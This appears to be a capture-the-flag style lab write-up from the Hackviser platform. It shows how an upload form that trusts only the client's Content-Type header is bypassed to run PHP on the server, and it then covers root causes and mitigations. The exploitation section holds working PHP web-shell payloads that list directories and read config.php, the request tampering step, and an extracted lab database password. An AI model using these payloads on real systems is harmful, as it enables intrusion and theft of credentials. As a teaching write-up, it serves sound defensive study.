---
title: "MIME Type Filter Bypass – Unrestricted File Upload to RCE | Hackviser Lab"
date: 2026-05-04 21:30:00 +0530
categories: [Web Security, Unrestricted File Upload]
tags: [file-upload, mime-type-bypass, rce, php, sensitive-data-exposure]
platform: Hackviser
author: Shivansh Sharma
image: 
    path: /assets/images/posts/mime-bypass-hackviser.webp
    alt: MIME Type Bypass File Upload 
---

## Overview

File upload functionality is a standard feature in modern web applications. However, improper validation can turn it into a critical attack vector.

In this lab, the application attempted to secure uploads using **MIME type validation only**. Since MIME types are fully controlled by the client, this protection was easily bypassed.

This allowed uploading a malicious PHP file, leading to **Remote Code Execution (RCE)** and exposure of sensitive database credentials.

---

## Objective

The lab stated:

> The application filters uploaded files based on MIME type.

**Goal:**
- Upload a malicious PHP file  
- Bypass MIME type validation  
- Read `config.php`  
- Extract the database password  

---

## Understanding the Vulnerability

The application validated uploads using only the HTTP header:

```
Content-Type: image/jpeg
```

### Why this is insecure

- MIME type is **client-controlled**
- Attackers can modify it easily
- Server does not verify actual file content

### Result

If the server:
- Does not inspect file content  
- Stores files in an executable directory  
- Allows direct access  

➡️ It leads to **Remote Code Execution**

---

## Exploitation

### Step 1: Create Initial PHP Payload

To confirm execution and identify the directory:

```php
<?php
echo "Upload working! Current directory: " . __DIR__ . "<br>";
echo "Files in current directory:<br>";
$files = scandir(__DIR__);
foreach ($files as $file) {
    echo $file . "<br>";
}
?>
```

Saved as:

```
shell.php
```

### Step 2: Intercept and Modify Request

Using Burp Suite, intercept the upload request.

**Original request:**

```
Content-Type: application/x-php
```

➡️ Server rejected it

**Modified request:**

```
Content-Type: image/jpeg
```

➡️ Upload succeeded

**Insight**

The server trusts only the MIME type header, not the actual file.

### Step 3: Execute Uploaded File

Accessing the uploaded file returned:

```
Upload working!
Current directory: /var/www/html/uploads
Files in current directory:
...
shell.php
```

**Key Findings**

- PHP execution is enabled
- Upload path identified:

```
/var/www/html/uploads
```

### Step 4: Locate config.php

Since uploads are stored in `/uploads`, the config file is likely in the parent directory.

Updated payload:

```php
<?php
$target = '../config.php';

if (file_exists($target)) {
    header('Content-Type: text/plain');
    echo file_get_contents($target);
} else {
    echo "config.php not found";
}
?>
```

Upload again using:

```
Content-Type: image/jpeg
```

### Step 5: Extract Credentials

Accessing the file returned:

```php
<?php
    try{
        $host = 'localhost';
        $db_name = 'hv_database';
        $charset = 'utf8';
        $username = 'root';
        $password = 'fRqs3s79mQxv6XVt';

        $db = new PDO("mysql:host=$host;dbname=$db_name;charset=$charset",$username,$password);
    } catch(PDOException $e){

    }
?>
```

**Proof of Exploitation**

- Successfully bypassed MIME filter
- Achieved PHP execution
- Read sensitive file (`config.php`)
- Extracted database credentials

**Database Password:**

```
fRqs3s79mQxv6XVt
```

---

## Impact

This vulnerability leads to severe consequences:

- Arbitrary file read
- Credential disclosure
- Remote Code Execution
- Database compromise
- Potential full system takeover

---

## Why MIME Type Validation Fails

The core issue is trusting user input.

**Problem**

The server relies on:

```
Content-Type: image/jpeg
```

**Reality**

- This value is set by the client
- Attackers can modify it freely
- File content remains unchanged

➡️ A PHP file can masquerade as an image

---

## Root Cause

The vulnerability exists due to:

**1. Trusting Client-Supplied Data**
- MIME type is not verified server-side

**2. No Content Validation**
- File contents not inspected

**3. Executable Upload Directory**
- Files can be executed after upload

**4. Storage in Web Root**
- Direct access via browser

---

## Mitigation

### Validate File Content

Use server-side inspection:

```
finfo_file()
```

### Restrict File Extensions

Allow only safe formats:

```
.jpg, .jpeg, .png, .gif
```

### Store Outside Web Root

- Prevent direct access
- Serve files via controlled endpoints

### Rename Uploaded Files

- Use random names
- Avoid predictable paths

### Disable Script Execution

Apache configuration:

```
php_admin_flag engine off
```

### Re-Encode Uploaded Files

- Use image processing libraries
- Strip malicious payloads

---

## Real-World Insight

This vulnerability is extremely common in real-world applications.

Attackers often:

- Upload web shells
- Extract configuration files
- Steal database credentials
- Escalate access across systems

MIME type bypass is one of the easiest ways to defeat weak upload filters.

---

## Key Takeaway

Relying on MIME type validation alone is a critical security mistake.

Since HTTP requests are fully controllable by attackers, this check provides no real protection.

A secure upload system must validate:

- File extension
- Actual file content
- Storage location
- Execution permissions

Otherwise, a simple upload feature becomes a direct path to Remote Code Execution.